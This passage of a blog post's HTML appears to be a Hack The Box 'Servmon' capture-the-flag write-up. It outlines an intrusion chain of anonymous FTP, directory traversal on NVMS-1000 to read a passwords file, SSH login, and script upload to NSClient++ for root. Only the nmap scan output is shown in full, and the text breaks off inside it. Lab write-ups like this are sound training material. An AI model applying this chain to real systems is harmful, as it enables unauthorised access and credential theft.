@@ -1,0 +1,743 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Anonymous access to ftp protocol and found that there exist a interesting file , Directory traversal on the nvms-1000 and grabbing that files and login in as a regular user ,Exploiting Nsclient that is running on port 8443 to get root." /><meta property="og:title" content="Hackthebox Servmon writeup" /><meta property="og:description" content="Anonymous access to ftp protocol and found that there exist a interesting file , Directory traversal on the nvms-1000 and grabbing that files and login in as a regular user ,Exploiting Nsclient that is running on port 8443 to get root." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/servmon/servmon.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Servmon writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Anonymous access to ftp protocol and found that there exist a interesting file , Directory traversal on the nvms-1000 and grabbing that files and login in as a regular user ,Exploiting Nsclient that is running on port 8443 to get root."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/servmon/servmon.png"><title>Hackthebox Servmon writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Servmon writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Servmon writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 13, 2020, 12:00 AM +0800" > Apr 13 <i class="unloaded">2020-04-13T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/servmon/servmon.png" class="post-preview-img"><h1 id="information">Information</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Servmon<tr><td>IP<td>10.10.10.184<tr><td>Points<td>20<tr><td>Os<td>Windows<tr><td>Difficulty<td>Easy<tr><td>Creator<td><a href="https://www.exploit-db.com/exploits/47774" target="_blank">dmw0ng</a><tr><td>Out On<td>11 April 2020</table></div><h1 id="brief">Brief</h1><p>Relatively a very easy box.Login to the <code class="language-plaintext highlighter-rouge">FTP</code> as anonymous login is allowed.The service <strong>nvms-1000</strong> is vulnerable to a public exploit(Directory inclusion).Reading the Passwords.txt file using the <code class="language-plaintext highlighter-rouge">Dir-traversel</code>.Hit and trial to ssh login as user Nadine.The service running on port <code class="language-plaintext highlighter-rouge">8443</code> <strong>Nsclient</strong> is vulnerable to public exploits and we can use that to get <code class="language-plaintext highlighter-rouge">root</code>.</p><h1 id="summary">Summary</h1><ul><li>Login to <strong>ftp</strong> <code class="language-plaintext highlighter-rouge">anonymously</code><li>Getting info from <strong>note.txt</strong> that there is a <strong>Passwords.txt</strong> in <code class="language-plaintext highlighter-rouge">Nathan/Desktop</code><li><code class="language-plaintext highlighter-rouge">Dir-traversel</code> on the <strong>NVMS-1000</strong><li>Extracting the <strong>Passwords.txt</strong><li>Logged in as <code class="language-plaintext highlighter-rouge">Nadine</code><li>Got user.txt<li>Port forward the port <code class="language-plaintext highlighter-rouge">8443</code> <strong>(Nsclient++)</strong><li>Uploading script to nsclient++ <strong>api</strong>.<li>Executing the <strong>script</strong> in the time <code class="language-plaintext highlighter-rouge">interval</code> of 1.<li>Got root.txt</ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/servmon/servmon.cast" start-at="0" autoplay="1.5" speed="1" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><ul><li>-sV : for Displaying service version<li>-sC : For Displaying Common-scripts availbale for that service<li>-p- : Scan for all the ports (65,535)<li>-T4 : Quick results<li>-oA : save the result in an output file</ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+</pre><td class="rouge-code"><pre>➜  servmon nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-p-</span> servmon.htb <span class="nt">-oA</span> nmap.full 
+<span class="c"># Nmap 7.80 scan initiated Sun Apr 12 08:41:28 2020 as: nmap -sV -sC -p- -T4 -oA nmap.full -v servmon.htb</span>
+Increasing send delay <span class="k">for </span>10.10.10.184 from 0 to 5 due to 1019 out of 2547 dropped probes since last increase.
+Warning: 10.10.10.184 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>servmon.htb <span class="o">(</span>10.10.10.184<span class="o">)</span>
+Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65459 closed ports, 57 filtered ports
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+22/tcp    open  ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions, RTSPRequest: 
+|     HTTP/1.1 200 OK
+|     Content-type: text/html
+|     Content-Length: 340
+|     Connection: close
+|     AuthInfo: 
+|     &lt;<span class="o">!</span>DOCTYPE html PUBLIC <span class="s2">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="s2">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="o">&gt;</span>
+|     &lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xhtml"</span><span class="o">&gt;</span>
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>
+|     &lt;title&gt;&lt;/title&gt;
+|     &lt;script <span class="nb">type</span><span class="o">=</span><span class="s2">"text/javascript"</span><span class="o">&gt;</span>
+|     window.location.href <span class="o">=</span> <span class="s2">"Pages/login.htm"</span><span class="p">;</span>
+|     &lt;/script&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   NULL: 
+|     HTTP/1.1 408 Request Timeout
+|     Content-type: text/html
+|     Content-Length: 0
+|     Connection: close
+|_    AuthInfo:
+|_http-favicon: Unknown favicon MD5: 3AEF8B29C4866F96A539730FAB53A88F
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+5666/tcp  open  tcpwrapped
+6063/tcp  open  tcpwrapped
+6699/tcp  open  napster?
+7680/tcp  open  pando-pub?
+8443/tcp  open  ssl/https-alt
+| fingerprint-strings: 
+|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+|     HTTP/1.1 404
+|     Content-Length: 18
+|     Document not found
+|   GetRequest: 
+|     HTTP/1.1 302
+|     Content-Length: 0
+|     Location: /index.html
+|     workers
+|_    <span class="nb">jobs</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2020-01-14T13:24:20
+| Not valid after:  2021-01-13T13:24:20
+| MD5:   1d03 0c40 5b7a 0f6d d8c8 78e3 cba7 38b4
+|_SHA-1: 7083 bd82 b4b0 f9c0 cc9c 5019 2f9f 9291 4694 8334
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+SF-Port80-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>4/12%Time<span class="o">=</span>5E9259F7%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NULL
+SF:,6B,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20408</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\x</span><span class="s2">20Timeout</span><span class="se">\r\n</span><span class="s2">Content-type:</span><span class="se">\x</span><span class="s2">20text/ht
+SF:ml</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">AuthInfo:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\r\n</span><span class="s2">
+SF:</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,1B4,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Content-type:</span><span class="se">\x</span><span class="s2">20tex
+SF:t/html</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20340</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">AuthInfo:</span><span class="se">\x</span><span class="s2">
+SF:20</span><span class="se">\r\n\r\n\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">bf&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html</span><span class="se">\x</span><span class="s2">20PUBLIC</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">-//W3C//DTD</span><span class="se">\x</span><span class="s2">20X
+SF:HTML</span><span class="se">\x</span><span class="s2">201</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20Transitional//EN</span><span class="se">\"\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">w3</span><span class="se">\.</span><span class="s2">org/TR/xhtml1/D
+SF:TD/xhtml1-transitional</span><span class="se">\.</span><span class="s2">dtd</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\r\n\r\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20xmlns=</span><span class="se">\"</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">w3</span><span class="se">\.</span><span class="s2">
+SF:org/1999/xhtml</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">&lt;head&gt;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;&lt;/title&gt;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
+SF:x20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;script</span><span class="se">\x</span><span class="s2">20type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
+SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20window</span><span class="se">\.</span><span class="s2">location</span><span class="se">\.</span><span class="s2">href</span><span class="se">\x</span><span class="s2">20=</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">Pages/login</span><span class="se">\.</span><span class="s2">htm</span><span class="se">\"</span><span class="s2">;</span><span class="se">\r\n\x</span><span class="s2">2
+SF:0</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;/script&gt;</span><span class="se">\r\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\r\n</span><span class="s2">&lt;body&gt;</span><span class="se">\r\n</span><span class="s2">&lt;/body&gt;</span><span class="se">\r\n</span><span class="s2">&lt;/html&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>
+SF:%r<span class="o">(</span>HTTPOptions,1B4,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Content-type:</span><span class="se">\x</span><span class="s2">20text/htm
+SF:l</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20340</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">AuthInfo:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\r\</span><span class="s2">
+SF:n</span><span class="se">\r\n\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">bf&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html</span><span class="se">\x</span><span class="s2">20PUBLIC</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">-//W3C//DTD</span><span class="se">\x</span><span class="s2">20XHTML</span><span class="se">\</span><span class="s2">
+SF:x201</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20Transitional//EN</span><span class="se">\"\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">w3</span><span class="se">\.</span><span class="s2">org/TR/xhtml1/DTD/xh
+SF:tml1-transitional</span><span class="se">\.</span><span class="s2">dtd</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\r\n\r\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20xmlns=</span><span class="se">\"</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">w3</span><span class="se">\.</span><span class="s2">org/1
+SF:999/xhtml</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">&lt;head&gt;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;&lt;/title&gt;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">
+SF:20</span><span class="se">\x</span><span class="s2">20&lt;script</span><span class="se">\x</span><span class="s2">20type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
+SF:x20</span><span class="se">\x</span><span class="s2">20window</span><span class="se">\.</span><span class="s2">location</span><span class="se">\.</span><span class="s2">href</span><span class="se">\x</span><span class="s2">20=</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">Pages/login</span><span class="se">\.</span><span class="s2">htm</span><span class="se">\"</span><span class="s2">;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20
+SF:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;/script&gt;</span><span class="se">\r\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\r\n</span><span class="s2">&lt;body&gt;</span><span class="se">\r\n</span><span class="s2">&lt;/body&gt;</span><span class="se">\r\n</span><span class="s2">&lt;/html&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RT
+SF:SPRequest,1B4,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20200</span><span class="se">\x</span><span class="s2">20OK</span><span class="se">\r\n</span><span class="s2">Content-type:</span><span class="se">\x</span><span class="s2">20text/html</span><span class="se">\r\n</span><span class="s2">
+SF:Content-Length:</span><span class="se">\x</span><span class="s2">20340</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n</span><span class="s2">AuthInfo:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\r\n\r\n</span><span class="s2">
+SF:</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">bf&lt;!DOCTYPE</span><span class="se">\x</span><span class="s2">20html</span><span class="se">\x</span><span class="s2">20PUBLIC</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">-//W3C//DTD</span><span class="se">\x</span><span class="s2">20XHTML</span><span class="se">\x</span><span class="s2">201</span><span class="se">\</span><span class="s2">
+SF:.0</span><span class="se">\x</span><span class="s2">20Transitional//EN</span><span class="se">\"\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">w3</span><span class="se">\.</span><span class="s2">org/TR/xhtml1/DTD/xhtml1-
+SF:transitional</span><span class="se">\.</span><span class="s2">dtd</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\r\n\r\n</span><span class="s2">&lt;html</span><span class="se">\x</span><span class="s2">20xmlns=</span><span class="se">\"</span><span class="s2">http://www</span><span class="se">\.</span><span class="s2">w3</span><span class="se">\.</span><span class="s2">org/1999/x
+SF:html</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\r\n</span><span class="s2">&lt;head&gt;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20&lt;title&gt;&lt;/title&gt;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
+SF:0&lt;script</span><span class="se">\x</span><span class="s2">20type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2">&gt;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">
+SF:20window</span><span class="se">\.</span><span class="s2">location</span><span class="se">\.</span><span class="s2">href</span><span class="se">\x</span><span class="s2">20=</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">Pages/login</span><span class="se">\.</span><span class="s2">htm</span><span class="se">\"</span><span class="s2">;</span><span class="se">\r\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20</span><span class="se">\</span><span class="s2">
+SF:x20&lt;/script&gt;</span><span class="se">\r\n</span><span class="s2">&lt;/head&gt;</span><span class="se">\r\n</span><span class="s2">&lt;body&gt;</span><span class="se">\r\n</span><span class="s2">&lt;/body&gt;</span><span class="se">\r\n</span><span class="s2">&lt;/html&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+SF-Port8443-TCP:V<span class="o">=</span>7.80%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>4/12%Time<span class="o">=</span>5E925A01%P<span class="o">=</span>x86_64-pc-linux-gn
+SF:u%r<span class="o">(</span>GetRequest,74,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20302</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\r\n</span><span class="s2">Location
+SF::</span><span class="se">\x</span><span class="s2">20/index</span><span class="se">\.</span><span class="s2">html</span><span class="se">\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</span><span class="s2">
+SF:</span><span class="se">\0\0\0\0\0\0\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">18</span><span class="se">\0\x</span><span class="s2">1aC</span><span class="se">\n\x</span><span class="s2">07workers</span><span class="se">\x</span><span class="s2">12</span><span class="se">\n\n\x</span><span class="s2">04jobs</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">1
+SF:8,</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">0f"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,36,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">201
+SF:8</span><span class="se">\r\n\r\n</span><span class="s2">Document</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20found"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,36,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">
